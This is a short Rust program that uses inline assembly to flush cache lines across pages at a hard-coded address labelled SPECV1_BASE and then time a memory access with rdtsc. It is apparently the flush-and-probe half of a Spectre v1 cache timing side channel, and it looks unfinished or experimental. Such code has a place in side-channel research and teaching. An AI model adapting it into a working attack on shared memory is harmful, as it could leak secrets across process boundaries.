#![feature(asm)]

const SPECV1_BASE: u64 = 0x00007ffff7dd7000;
const SPECV1_NPAGES: usize = 38;

const PAGE_SIZE: usize = 1 << 12; //bytes

fn clflush_page(page_address: u64) {
    let cl_size: usize = 1 << 6; // bytes

    for cline in 0..=PAGE_SIZE / cl_size - 1 {
        let address = page_address + (cline * cl_size) as u64;
        clflush(address);
    }
}

fn clflush(address: u64) {
    unsafe{
        asm!{
            "clflush [rax]",
            in("rax") address,
        };
    }
}

fn prime(address: u64, npages: usize) {
    for page in 0..=npages - 1 {
        clflush_page(address + (page * PAGE_SIZE) as u64);
    }
}

fn rdtsc() -> u64 {
    let result: u64;
    unsafe{
        asm!{"
            rdtsc
            shl rdx, 32
            or rax, rdx
            ",
            out("rax") result,
            out("rdx") _,
        };
    }
    return result;
}

fn time_access(address: u64) -> u64 {
    let start = rdtsc();
    unsafe{
        asm!{"
            mov rdi, [rdi]
            lfence
            ", in("rdi") address
        };
    }
    let end = rdtsc();
    return end - start;
}

fn probe(address: u64, _ncache_lines: usize) {
    let elapsed = time_access(address);
    println!("{}", elapsed);
}

fn main() {
    prime(SPECV1_BASE, SPECV1_NPAGES);
    probe(SPECV1_BASE, 256 * 256);
}
